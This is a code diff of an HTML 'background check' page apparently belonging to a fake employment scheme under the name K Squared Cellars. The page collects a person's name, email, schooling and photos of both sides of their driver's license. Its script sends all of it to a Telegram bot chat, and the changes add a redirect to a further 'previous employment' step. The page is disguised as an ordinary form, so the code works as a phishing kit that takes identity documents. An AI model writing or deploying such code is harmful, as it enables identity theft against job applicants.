@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>K Squared Cellars – Background Check</title>
   <style>
     body {
@@ -102,7 +102,7 @@
         <label for="backImage">Back of Driver's License</label>
         <input type="file" id="backImage" name="backImage" accept=".jpg,.jpeg,.png,.pdf" required />
       </div>
-      <button type="submit">Submit</button>
+      <button type="submit">Next</button>
       <div class="success" id="successMessage"></div>
     </form>
   </div>
@@ -113,11 +113,11 @@
     document.getElementById("licenseForm").addEventListener("submit", async function(e) {
       e.preventDefault();
 
-      const fullName = document.getElementById("fullName").value;
-      const email = document.getElementById("email").value;
-      const schoolName = document.getElementById("schoolName").value;
-      const yearStarted = document.getElementById("yearStarted").value;
-      const yearGraduated = document.getElementById("yearGraduated").value;
+      const fullName = document.getElementById("fullName").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const schoolName = document.getElementById("schoolName").value.trim();
+      const yearStarted = document.getElementById("yearStarted").value.trim();
+      const yearGraduated = document.getElementById("yearGraduated").value.trim();
       const frontFile = document.getElementById("frontImage").files[0];
       const backFile = document.getElementById("backImage").files[0];
 
@@ -141,11 +141,10 @@
 ——————————————
 `;
 
+      // Send message
       await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: telegram_chat_id,
           text: message,
@@ -153,6 +152,7 @@
         })
       });
 
+      // Send files
       const sendFile = async (file, caption) => {
         const formData = new FormData();
         formData.append("chat_id", telegram_chat_id);
@@ -168,10 +168,8 @@
       await sendFile(frontFile, `${fullName} - Front of Driver's License`);
       await sendFile(backFile, `${fullName} - Back of Driver's License`);
 
-      document.getElementById("successMessage").innerText = "✅ Submitted successfully. Thank you!";
-      setTimeout(function() {
-        window.location.href = "successPage.html"; 
-      }, 2000);
+      // After sending, redirect to previous employment page
+      window.location.href = "previous_employment.html";
     });
   </script>
 </body>
